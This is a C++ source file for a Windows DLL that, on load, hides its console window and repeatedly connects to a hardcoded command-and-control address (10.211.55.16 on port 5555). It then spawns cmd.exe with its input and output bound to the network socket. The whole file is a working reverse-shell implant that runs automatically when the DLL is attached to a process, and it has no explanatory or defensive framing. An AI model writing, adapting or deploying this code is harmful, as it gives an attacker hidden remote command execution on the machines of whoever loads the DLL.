// dllmain.cpp : 定义 DLL 应用程序的入口点
#include "pch.h"
#include <string>
#include <stdlib.h>
#include <winsock2.h>

#pragma comment(lib,"ws2_32.lib")

#define DEFAULT_BUFLEN 1024

char msg1[] = "Client Connected. Press Enter to spawn shell.\r\n";
char msg2[] = "Shell Exited. Press Enter q to disconnected client:";

void RunShell(char * C2Server, int C2Port) {
	while (true) {
		Sleep(5000); //wait 5 seconds
		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA  version;
		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);
		
		/*
		WSABUF CalleeData;
		char CalleeBuf[] = "Client Connected. Press Enter to spawn shell.\r\n";
		CalleeData.buf = CalleeBuf;
		CalleeData.len = strlen(CalleeBuf);
	    */
		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
		{
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else
		{
			//提示按回车生成cmdshell
			int iResult = send(mySocket, msg1, strlen(msg1), 0);
			if (iResult == SOCKET_ERROR) {
				OutputDebugString(L"[DBG]send msg1 failed with error");
				closesocket(mySocket);
				WSACleanup();
				continue;
			}

			char RecvData[DEFAULT_BUFLEN];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
			if (RecvCode <= 0) {
				closesocket(mySocket);
				WSACleanup();
				continue;
			}
			else
			{
				TCHAR Process[] = L"cmd.exe";
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);//wait for this child process i.e. cmd.exe to finish,如输入exit
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);

				// send msg to enter q
				int iResult = send(mySocket, msg2, strlen(msg2), 0);
				if (iResult == SOCKET_ERROR) {
					OutputDebugString(L"[DBG]send msg2 failed with error");
					closesocket(mySocket);
					WSACleanup();
					continue;
				}
				// wait for input data
				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
				if (RecvCode <= 0) {
					closesocket(mySocket);
					WSACleanup();
					continue;
				}
				if (strncmp(RecvData, "q",1) == 0) {
					//exit(0);//I will agian for buffer to be recived over the network,if i receive a string exit.
					closesocket(mySocket);
					WSACleanup();
					exit(0);
				}
			}
		}
	}
}

int port = 5555;
char ip[] = "10.211.55.16";

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		FreeConsole();//function to disable the console window so that it is not visible to the user
		RunShell(ip, port);
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

